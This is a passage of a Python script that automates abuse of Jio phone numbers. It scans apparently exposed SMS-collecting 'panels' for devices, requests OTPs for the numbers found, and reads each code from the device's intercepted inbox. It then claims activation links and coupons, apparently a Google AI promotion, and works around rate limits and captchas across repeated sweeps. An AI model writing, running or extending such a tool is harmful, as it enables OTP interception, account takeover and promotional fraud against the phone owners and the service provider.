            output.result(state["serial"], device, mobile, "otp_locked", "", plan=plan)
            print("Status: otp_locked")
            continue
        if sent == "rate":
            statuses["rate_limited"] += 1
            output.result(state["serial"], device, mobile, "rate_limited", "", plan=plan)
            print("Status: rate_limited")
            wait_out_captcha(jio, mobile, args.captcha_wait)
            continue
        if sent == "invalid":
            statuses["not_jio_number"] += 1
            output.add_number(mobile)
            output.result(state["serial"], device, mobile, "not_jio_number", "", plan=plan)
            print("Status: not_jio_number")
            continue
        if sent != "ok":
            statuses["otp_send_failed"] += 1
            output.result(state["serial"], device, mobile, "otp_send_failed", "", plan=plan)
            print(f"Status: otp_send_failed ({sent})")
            continue

        fired = True
        otp = wait_for_otp(
            device["session"], device["panel"], device["device_id"], device["node"],
            device["known"], device["newest"], mobile, args.otp_timeout,
            args.poll_interval, pool,
        )
        if not otp:
            statuses["otp_failed"] += 1
            output.result(state["serial"], device, mobile, "otp_failed", "", plan=plan)
            print("Status: otp_failed")
            continue

        status, url, coupon = claim_activation(jio)
        if status in ("already_active", "google_ai_unauthorized"):
            blocked[mobile] = time.time() + LOCK_BLOCK
        statuses[status] += 1
        output.add_number(mobile)
        output.result(state["serial"], device, mobile, status, url, coupon, plan)
        print(f"Status: {status}")
        if coupon:
            print(f"COUPON -> {coupon}")
        if url:
            print(f"LINK -> {url}")
        return status, url, coupon

    return ("otp_failed" if fired else "no_candidate"), "", ""


def discover(args: argparse.Namespace, fresh_min: int) -> list[dict[str, Any]]:
    """Resolve panels, then collect viable devices. `fresh_min` filters inbox age."""
    panels = resolve_panels(args)
    if args.skip:
        panels = panels[args.skip:]
    if args.limit:
        panels = panels[: args.limit]
    found: list[dict[str, Any]] = []
    for index, panel in enumerate(panels, start=1):
        session = firebase_session()          # one session per panel, not shared
        try:
            devices = scan_panel(session, panel, args.message_limit)
        except (requests.RequestException, ValueError) as exc:
            print(f"[{index}/{len(panels)}] {panel['url']} -> {type(exc).__name__}")
            continue
        cutoff = time.time() * 1000 - fresh_min * 60_000
        devices = [d for d in devices if (d["newest"] or 0) >= cutoff]
        if devices:
            print(f"[{index}/{len(panels)}] {panel['url']} -> {len(devices)} device(s)"
                  f" [{panel['schema']}]")
            for device in devices:
                device["session"] = session
            found.extend(devices)
    found.sort(key=lambda d: -(d["newest"] or 0))
    return found


def main() -> int:
    args = parse_args()

    print("=" * 70)
    print("STEP 1: resolving live panels...")
    print("=" * 70)
    panels = resolve_panels(args)
    if args.skip:
        panels = panels[args.skip:]
    if args.limit:
        panels = panels[: args.limit]
    if args.write_panels:
        discovery.write_panels_file([(p["url"], p["key"], p["schema"]) for p in panels])
        print(f"wrote {len(panels)} panels -> {discovery.PANELS_FILE}")
        return 0
    print(f"Panels to scan: {len(panels)}")
    if not panels:
        print("No live panels. Run: python panel_discovery.py --refresh --print")
        return 1

    output = Output()
    state: dict[str, Any] = {"blocked": {}, "serial": 0}
    statuses: Counter[str] = Counter()
    links = 0
    tried_devices: set[str] = set()

    try:
        for sweep in range(1, max(1, args.sweeps) + 1):
            print("\n" + "=" * 70)
            print(f"STEP 2: device sweep {sweep}/{max(1, args.sweeps)}"
                  f" (inbox fresher than {args.fresh_min}m)")
            print("=" * 70)
            found = discover(args, args.fresh_min)
            found = [d for d in found
                     if f"{d['panel']['url']}|{d['device_id']}" not in tried_devices]
            print(f"New devices with candidates: {len(found)}")
            if not found:
                if sweep == max(1, args.sweeps):
                    print("No devices. Try: python panel_discovery.py --refresh")
                continue

            print("\n" + "=" * 70)
            print("STEP 3: OTP + activation")
            print("=" * 70)
            for device in found:
                if args.max_numbers and state["serial"] >= args.max_numbers:
                    break
                tried_devices.add(f"{device['panel']['url']}|{device['device_id']}")
                status, url, _coupon = process_device(device, state, args, output, statuses)
                if output.add_link(url):
                    links += 1
                if status == "rate_limited":
                    time.sleep(BACKOFF_429)
            if args.max_numbers and state["serial"] >= args.max_numbers:
                break
            if sweep < max(1, args.sweeps):
                time.sleep(args.sweep_gap)
    except KeyboardInterrupt:
        print("\n\nInterrupted by user. Partial results are already on disk.")

    print("\n" + "=" * 70)
    print("FINAL SUMMARY")
    print("=" * 70)
    print(f"Panels scanned : {len(panels)}")
    print(f"Numbers tried  : {state['serial']}")
    print(f"New links      : {links}")
    for status, count in sorted(statuses.items()):
        print(f"  {status:22}: {count}")
    print(f"\nLinks   : {LINKS_FILE}")
    print(f"Results : {RESULTS_FILE}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
